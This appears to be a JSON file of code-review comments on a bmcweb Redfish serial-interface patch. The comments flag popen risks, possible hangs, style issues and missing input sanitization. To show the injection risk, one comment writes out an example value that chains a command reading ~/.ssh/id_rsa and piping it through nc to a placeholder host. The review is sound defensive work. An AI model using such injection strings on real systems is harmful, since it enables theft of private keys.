@@ -1,0 +1,142 @@
+{
+  "comments": [
+    {
+      "key": {
+        "uuid": "3240be07_4c316da7",
+        "filename": "redfish-core/lib/serial_interface.hpp",
+        "patchSetId": 1
+      },
+      "lineNbr": 39,
+      "author": {
+        "id": 1000593
+      },
+      "writtenOn": "2021-07-19T18:09:57Z",
+      "side": 1,
+      "message": "There are many security considerations when using popen.",
+      "range": {
+        "startLine": 39,
+        "startChar": 16,
+        "endLine": 39,
+        "endChar": 21
+      },
+      "revId": "91cece6bbf076998775ab023dd4d98512354d44f",
+      "serverId": "adbd0a64-1f21-4d83-b585-671fe73cb6e4",
+      "unresolved": true
+    },
+    {
+      "key": {
+        "uuid": "7b478337_0fa504dc",
+        "filename": "redfish-core/lib/serial_interface.hpp",
+        "patchSetId": 1
+      },
+      "lineNbr": 45,
+      "author": {
+        "id": 1000593
+      },
+      "writtenOn": "2021-07-19T18:09:57Z",
+      "side": 1,
+      "message": "if the pipe does not close, does this hang bmcweb?",
+      "range": {
+        "startLine": 45,
+        "startChar": 4,
+        "endLine": 45,
+        "endChar": 9
+      },
+      "revId": "91cece6bbf076998775ab023dd4d98512354d44f",
+      "serverId": "adbd0a64-1f21-4d83-b585-671fe73cb6e4",
+      "unresolved": true
+    },
+    {
+      "key": {
+        "uuid": "0d76528a_6267c9a3",
+        "filename": "redfish-core/lib/serial_interface.hpp",
+        "patchSetId": 1
+      },
+      "lineNbr": 88,
+      "author": {
+        "id": 1000593
+      },
+      "writtenOn": "2021-07-19T18:09:57Z",
+      "side": 1,
+      "message": "why can\u0027t you stat\n\"/sys/class/tty/ttyS0/device/driver\"\nand append it to the results?",
+      "range": {
+        "startLine": 88,
+        "startChar": 0,
+        "endLine": 88,
+        "endChar": 44
+      },
+      "revId": "91cece6bbf076998775ab023dd4d98512354d44f",
+      "serverId": "adbd0a64-1f21-4d83-b585-671fe73cb6e4",
+      "unresolved": true
+    },
+    {
+      "key": {
+        "uuid": "b611b9dd_1cb9e1a1",
+        "filename": "redfish-core/lib/serial_interface.hpp",
+        "patchSetId": 1
+      },
+      "lineNbr": 120,
+      "author": {
+        "id": 1000593
+      },
+      "writtenOn": "2021-07-19T18:09:57Z",
+      "side": 1,
+      "message": "Can you handle errors without indenting, and instead using continue. \nWe get pretty far indented up there.",
+      "range": {
+        "startLine": 120,
+        "startChar": 28,
+        "endLine": 120,
+        "endChar": 44
+      },
+      "revId": "91cece6bbf076998775ab023dd4d98512354d44f",
+      "serverId": "adbd0a64-1f21-4d83-b585-671fe73cb6e4",
+      "unresolved": true
+    },
+    {
+      "key": {
+        "uuid": "54011dc8_a469a0d1",
+        "filename": "redfish-core/lib/serial_interface.hpp",
+        "patchSetId": 1
+      },
+      "lineNbr": 153,
+      "author": {
+        "id": 1000593
+      },
+      "writtenOn": "2021-07-19T18:09:57Z",
+      "side": 1,
+      "message": "what if for serialInstance do some injection?\nserialInstance \u003d \"sty123 \u0026\u0026 cat ~/. ssh/id_rsa | nc 1.2.3.4:123; #\"\nI don\u0027t see any input sanitzation, that make this look vulnerable to injection.",
+      "range": {
+        "startLine": 151,
+        "startChar": 39,
+        "endLine": 153,
+        "endChar": 75
+      },
+      "revId": "91cece6bbf076998775ab023dd4d98512354d44f",
+      "serverId": "adbd0a64-1f21-4d83-b585-671fe73cb6e4",
+      "unresolved": true
+    },
+    {
+      "key": {
+        "uuid": "f2afc3d6_9376ee45",
+        "filename": "static/redfish/v1/$metadata/index.xml",
+        "patchSetId": 1
+      },
+      "lineNbr": 2319,
+      "author": {
+        "id": 1000593
+      },
+      "writtenOn": "2021-07-19T18:09:57Z",
+      "side": 1,
+      "message": "Please switch to spaces for indentation.",
+      "range": {
+        "startLine": 2319,
+        "startChar": 0,
+        "endLine": 2319,
+        "endChar": 2
+      },
+      "revId": "91cece6bbf076998775ab023dd4d98512354d44f",
+      "serverId": "adbd0a64-1f21-4d83-b585-671fe73cb6e4",
+      "unresolved": true
+    }
+  ]
+}
